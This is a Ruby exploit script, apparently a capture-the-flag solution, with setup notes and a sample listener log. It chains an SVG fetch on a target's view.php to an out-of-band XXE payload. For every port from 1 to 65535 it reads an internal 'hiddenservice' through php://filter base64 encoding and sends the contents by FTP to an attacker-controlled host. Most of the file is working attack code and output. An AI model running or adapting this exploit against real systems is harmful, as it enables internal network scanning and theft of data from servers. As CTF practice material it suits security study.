#!/usr/bin/env ruby

=begin
Separate the HHTP server from the FTP server in order to not pollute the FTP logs

1. python -m http.server --bind 192.168.1.84 8080
2. ./xxeserv -p 2121
3. ruby bf_ports.rb

Then looks carefully the logs of xxeserv for incoming messages, you'll see something like

```
2019/11/11 21:40:15 [*] Connection Accepted from [172.22.0.2:43578]
USER:  anonymous
PASS:  anonymous
//9999/PCFET0NUWVBFIGh0bWw+CjxodG1sPgogIDxoZWFkPgogICAgPG1ldGEgY2hhcnNldD0iVVRGLTgiPgogICAgPG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xIj4KICAgIDwhLS08bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9Imh0dHBzOi8vY2RuLmpzZGVsaXZyLm5ldC9ucG0vYnVsbWFAMC44LjAvY3NzL2J1bG1hLm1pbi5jc3MiPi0tPgogICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJjc3MvYnVsbWEubWluLmNzcyI+CiAgICA8IS0tPHNjcmlwdCBkZWZlciBzcmM9Imh0dHBzOi8vdXNlLmZvbnRhd2Vzb21lLmNvbS9yZWxlYXNlcy92NS4zLjEvanMvYWxsLmpzIj48L3NjcmlwdD4tLT4KICAgIDxzY3JpcHQgZGVmZXIgc3JjPSJqcy9mYS5qcyI+PC9zY3JpcHQ+CiAgICA8dGl0bGU+SGlkZGVuIHNlcnZpY2U8L3RpdGxlPgogIDwvaGVhZD4KICA8Ym9keT4KICAgIDxzZWN0aW9uIGNsYXNzPSJzZWN0aW9uIj4KICAgICAgPGRpdiBjbGFzcz0iY29udGFpbmVyIj4KICAgICAgICA8aDEgY2xhc3M9InRpdGxlIj5IaWRkZW4gc2VydmljZTwvaDE+CiAgICAgIDxwcmU+PGNvZGU+YXNrIGZvciB1cmw9aHR0cDovL2RvbWFpbiBpbiBhIEdFVCByZXF1ZXN0LCBQUzogZmxhZyBpcyBvbiBsb2NhbGhvc3QgcG9ydCAxMDAwMDwvY29kZT48L3ByZT4KICAgICAgPC9kaXY+CiAgICA8L3NlY3Rpb24+CiAgICA8Zm9vdGVyIGNsYXNzPSJmb290ZXIiPgogICAgICA8ZGl2IGNsYXNzPSJjb250ZW50IGhhcy10ZXh0LWNlbnRlcmVkIj4KICAgICAgICA8cD4gCiAgICAgICAgICBNYWRlIHdpdGgKICAgICAgICAgIDxzcGFuIGNsYXNzPSJpY29uIGhhcy10ZXh0LWRhbmdlciI+PGkgY2xhc3M9ImZhcyBmYS1oZWFydCI+PC9pPjwvc3Bhbj4KICAgICAgICAgIGJ5CiAgICAgICAgICA8c3BhbiBjbGFzcz0iaGFzLXRleHQtd2VpZ2h0LXNlbWlib2xkIj4KICAgICAgICAgICAgPGEgY2xhc3M9Imhhcy10ZXh0LXByaW1hcnkiIGhyZWY9Imh0dHBzOi8vcHduLmJ5L25vcmFqLyI+bm9yYWo8L2E+CiAgICAgICAgICA8L3NwYW4+CiAgICAgICAgPC9wPgogICAgICA8L2Rpdj4KICAgIDwvZm9vdGVyPgogIDwvYm9keT4KPC9odG1sPg==
SIZE
MDTM
2019/11/11 21:40:15 [x] Connection Closed
2019/11/11 21:40:15 [*] Closing FTP Connection
```

`9999` is the port and you can decode the content of the web page in base64.
=end

require 'net/http'

# Web request
target_host = '127.0.0.1'
target_port = 42422
my_host = '192.168.1.84'
my_port = 8080
svg_file = 'xxe.svg'
target_url = "http://#{target_host}:#{target_port}/view.php?svg=http%3A%2F%2F#{my_host}%3A#{my_port}%2F#{svg_file}"
# XXE OOB payload
xml_file = 'xxe.xml'
ftp_port = 2121

(1..65535).each do |port|
  # XXE OOB payload
  bf_port = port
  xxe_payload = "php://filter/convert.base64-encode/resource=http://hiddenservice:#{bf_port}"
  line1 = "<!ENTITY % data SYSTEM \"#{xxe_payload}\">"
  line2 = "<!ENTITY % param1 \"<!ENTITY exfil SYSTEM 'ftp://#{my_host}:#{ftp_port}/#{bf_port}/%data;'>\">"
  # Edit payload
  File.open(xml_file, 'w+') do |file|
    file.puts line1
    file.puts line2
  end
  Net::HTTP.get(URI(target_url))
end

